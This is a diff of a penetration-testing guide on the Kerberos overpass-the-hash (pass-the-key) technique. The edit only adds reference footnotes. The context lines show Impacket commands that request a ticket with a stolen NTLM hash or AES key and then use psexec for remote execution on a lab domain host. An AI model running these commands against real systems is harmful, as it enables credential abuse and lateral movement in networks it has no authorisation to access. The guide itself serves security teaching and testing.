@@ -16,7 +16,7 @@ This difference matters in hardened environments: if **RC4 is disabled** or no l
 
 To execute this attack, the initial step involves acquiring the NTLM hash or password of the targeted user's account. Upon securing this information, a Ticket Granting Ticket (TGT) for the account can be obtained, allowing the attacker to access services or machines to which the user has permissions.
 
-The process can be initiated with the following commands:
+The process can be initiated with the following commands:<sup>[[1]](#references)</sup>
 
 ```bash
 python getTGT.py -dc-ip 10.10.10.10 jurassic.park/velociraptor -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7
@@ -24,7 +24,7 @@ export KRB5CCNAME=/root/impacket-examples/velociraptor.ccache
 python psexec.py jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass
 ```
 
-For scenarios necessitating AES256, the `-aesKey [AES key]` option can be utilized:
+For scenarios necessitating AES256, the `-aesKey [AES key]` option can be utilized:<sup>[[1]](#references)</sup>
 
 ```bash
 python getTGT.py -dc-ip 10.10.10.10 jurassic.park/velociraptor -aesKey <AES256_HEX>
